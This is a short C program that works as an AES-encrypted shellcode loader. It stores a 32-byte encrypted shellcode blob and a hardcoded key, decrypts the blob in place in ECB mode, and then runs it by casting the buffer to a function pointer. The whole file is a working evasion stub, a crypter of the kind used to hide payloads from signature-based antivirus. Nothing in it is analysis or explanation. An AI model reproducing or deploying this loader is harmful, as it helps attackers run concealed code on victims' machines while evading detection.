#include<stdio.h>
#include<stdlib.h>
#include<string.h>

#define CBC 0
#define ECB 1
#include "aes.h"


#define BLOCK_LENGTH 16

uint8_t key[BLOCK_LENGTH] = { 'm','y','-','b','a','d','-','k','e','y' };        //128bit key
unsigned char shellcode[] =
"\xc2\x7e\x86\x03\xb4\x38\xc6\x6d\x4a\xe2\x69\x3d\x6d\xae\xe1\x08\xa4\xc2\x3e\x81\xa9\x80\xdf\xc5\x1e\xbe\x9e\x40\x22\xc7\x02\xa9"
;

int main(int argc, char **argv)
{
	int (*ret)() = (int(*)())shellcode;
	uint8_t block[BLOCK_LENGTH];
	int i,j;
	int shellcode_size;

	shellcode_size=sizeof(shellcode);
	--shellcode_size;	//Since its posted as string, a unwanted null ybte is at the ende

	if (shellcode_size%BLOCK_LENGTH != 0)
	{
		printf("Wrong shellcode size, not n*16byte\n");
		return 1;
	}



	//decrypt shellcode (to shellcode)
	for (i = 0; i < shellcode_size/BLOCK_LENGTH; ++i)
	{
		AES128_ECB_decrypt(shellcode + i*BLOCK_LENGTH, key, block);

		for (j=0; j<BLOCK_LENGTH; ++j)
		{
//			printf("\\x%02x",block[j]);

			//write into shellcode
			shellcode[i*BLOCK_LENGTH + j] = block[j];
		}

	}


	//run shellcode
	ret();

	printf("\n\n");
	return 1;
}
